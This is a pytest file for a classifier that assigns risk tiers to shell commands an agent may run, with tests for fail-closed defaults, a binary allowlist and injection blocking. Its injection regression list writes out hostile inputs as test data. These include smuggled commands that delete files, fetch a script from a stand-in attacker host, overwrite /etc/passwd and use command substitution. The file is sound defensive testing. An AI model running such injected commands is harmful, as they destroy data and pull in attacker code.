"""Table-driven tests for the risk tier classifier.

Every rule in policy/tool-tiers.yaml must appear in CASES. test_every_rule_is_covered
enforces that, so adding a rule without a test is a failing build rather than a
silent gap - which is how the shell-injection hole survived the first time.
"""

from __future__ import annotations

import pytest

from risk_broker.tiers import Policy

policy = Policy()


# (command, expected_tier, expected_rule)
CASES: list[tuple[str, int, str]] = [
    # ------------------------------------------------------------------ T3
    ("cp scratch/draft.md wiki/parts/part-esp32c6.md", 3, "kb-canonicalize"),
    ("git add wiki/parts/part-esp32c6.md", 3, "kb-canonicalize"),
    ("crwl https://docs.example.com --depth 3", 3, "bulk-crawl"),
    ("scrapy crawl vendordocs", 3, "bulk-crawl"),
    ("espefuse.py --port /dev/cu.usbmodem1101 burn_key BLOCK_KEY0 key.bin", 3, "efuse-burn"),
    ("espefuse burn_efuse DIS_DOWNLOAD_MODE 1", 3, "efuse-burn"),
    ("esptool.py --encrypt write_flash 0x10000 app.bin", 3, "secure-boot-or-flash-encryption"),
    ("idf.py flash-encryption-status", 3, "secure-boot-or-flash-encryption"),
    ("avrdude -c usbasp -p m328p -U lfuse:w:0x62:m", 3, "avr-fuse-write"),
    ("curl -X POST https://example.com/cart/submit", 3, "spend-money"),
    ("jlcpcb-cli place_order board.zip", 3, "spend-money"),
    ("gcode send job.gcode", 3, "machine-motion"),
    ("grbl-stream job.nc", 3, "machine-motion"),
    # ------------------------------------------------------------------ T2
    ("curl https://docs.espressif.com/esp32c6_datasheet_en.pdf", 2, "outbound-fetch"),
    ("trafilatura -u https://example.com/page", 2, "outbound-fetch"),
    ("cp raw/ds.pdf scratch/ds.pdf", 2, "scratch-write"),
    ("esptool.py --port /dev/cu.usbmodem1101 write_flash 0x0 fw.bin", 2, "flash-firmware"),
    ("esphome run lamp.yaml", 2, "flash-firmware"),
    ("pio run -t upload", 2, "flash-firmware"),
    ("idf.py -p /dev/cu.usbmodem1101 flash", 2, "flash-firmware"),
    ("openocd -f board.cfg", 2, "debugger-write"),
    ("probe-rs download firmware.elf", 2, "debugger-write"),
    ("picotool load firmware.uf2", 2, "debugger-write"),
    ("gpioset gpiochip0 17=1", 2, "device-io-write"),
    ("mosquitto_pub -t lamp/set -m ON", 2, "device-io-write"),
    # ------------------------------------------------------------------ T1
    ("rg -n brownout wiki/", 1, "kb-search"),
    ("python3 harness/kb/lint.py wiki/", 1, "kb-search"),
    ("docling raw/esp32c6.pdf", 1, "local-extract"),
    ("ollama run qwen2.5", 1, "local-extract"),
    ("kicad-cli pcb drc board.kicad_pcb", 1, "eda"),
    ("ngspice -b sim.cir", 1, "eda"),
    ("kikit panelize board.kicad_pcb panel.kicad_pcb", 1, "eda"),
    ("idf.py build", 1, "build"),
    ("arduino-cli compile --fqbn esp32:esp32:esp32c6 .", 1, "build"),
    ("pio run", 1, "build"),
    ("esphome compile lamp.yaml", 1, "build"),
    ("wokwi-cli .", 1, "build"),
    ("orcaslicer --slice 0 part.stl", 1, "slice"),
    ("CuraEngine slice -j profile.json", 1, "slice"),
    ("sigrok-cli --samples 1000", 1, "read-only-instrument"),
    ("idf.py monitor", 1, "read-only-instrument"),
    ("i2cdetect -y 1", 1, "read-only-instrument"),
]


@pytest.mark.parametrize("command,tier,rule", CASES, ids=[c[0] for c in CASES])
def test_classification(command: str, tier: int, rule: str) -> None:
    c = policy.classify(command)
    assert (c.tier, c.rule) == (tier, rule), f"{command!r} -> T{c.tier} {c.rule}"


def test_every_rule_is_covered() -> None:
    """A rule with no test case is a gap. Fail rather than let it through."""
    covered = {rule for _, _, rule in CASES}
    missing = [name for name in policy.rule_names if name not in covered]
    assert not missing, f"rules in tool-tiers.yaml with no test case: {missing}"


# ---------------------------------------------------------------- fail closed


@pytest.mark.parametrize(
    "command",
    [
        "frobnicate --all",
        "esptool.py --port /dev/cu.usbmodem1101 read_flash 0 0x400000 dump.bin",
        "make install",
        "pip install requests",
        "python3 -c 'print(1)'",
    ],
)
def test_unknown_commands_fail_closed_to_t3(command: str) -> None:
    c = policy.classify(command)
    assert c.tier == 3
    assert c.rule == "unmatched"


def test_default_tier_is_three() -> None:
    assert policy.default_tier == 3


# ------------------------------------------------------------ binary allowlist


@pytest.mark.parametrize(
    "command,binary",
    [
        ("kicad-cli pcb drc board.kicad_pcb", "kicad-cli"),
        ("/opt/homebrew/bin/kicad-cli pcb drc board.kicad_pcb", "kicad-cli"),
        ("IDF_PATH=/opt/esp-idf idf.py build", "idf.py"),
    ],
)
def test_allowed_binaries_are_recognised(command: str, binary: str) -> None:
    c = policy.classify(command)
    assert c.binary == binary
    assert c.allowed_binary is True


@pytest.mark.parametrize(
    "command,binary",
    [
        ("rm -rf /tmp/x", "rm"),
        ("cp scratch/a.md wiki/a.md", "cp"),
        ("pip install requests", "pip"),
        ("bash script.sh", "bash"),
    ],
)
def test_disallowed_binaries_are_flagged(command: str, binary: str) -> None:
    c = policy.classify(command)
    assert c.binary == binary
    assert c.allowed_binary is False
    assert c.runnable is False


# ------------------------------------------------------- injection regression


INJECTIONS = [
    "kicad-cli sch erc b.kicad_sch; rm -rf ~/Documents",
    "kicad-cli pcb drc b.kicad_pcb && curl http://evil.example.com/x.sh",
    "idf.py build | tee /tmp/out",
    "ngspice -b sim.cir > /etc/passwd",
    "kicad-cli version `whoami`",
    "kicad-cli version $(whoami)",
    "idf.py build\nrm -rf /tmp/x",
]


@pytest.mark.parametrize("command", INJECTIONS, ids=[repr(i) for i in INJECTIONS])
def test_shell_metacharacters_are_refused(command: str) -> None:
    """Regression for REVIEW.md §1.1.

    Each of these previously classified as T1 with an allowed binary, because
    only the first token was inspected while the whole string went to a shell.
    """
    c = policy.classify(command)
    assert c.blocked == "unparseable", f"{command!r} was not blocked"
    assert c.tier == 3
    assert c.runnable is False


def test_unbalanced_quotes_are_refused() -> None:
    c = policy.classify('kicad-cli pcb drc "unclosed.kicad_pcb')
    assert c.blocked == "unparseable"
    assert c.tier == 3


@pytest.mark.parametrize("command", ["", "   ", "\t"])
def test_empty_commands_are_refused(command: str) -> None:
    c = policy.classify(command)
    assert c.blocked == "unparseable"
    assert c.tier == 3


def test_lint_py_rule_does_not_admit_arbitrary_scripts() -> None:
    """The kb-search rule used to match any path ending in lint.py, which made
    'python3 /tmp/lint.py' a T1 arbitrary-code-execution path."""
    c = policy.classify("python3 /tmp/lint.py")
    assert c.tier == 3
    assert c.rule == "unmatched"


def test_first_matching_rule_wins_t3_before_t2() -> None:
    """A command that matches both a T3 and a T2 rule must classify as T3."""
    c = policy.classify("esptool.py --encrypt write_flash 0x10000 app.bin")
    assert c.tier == 3
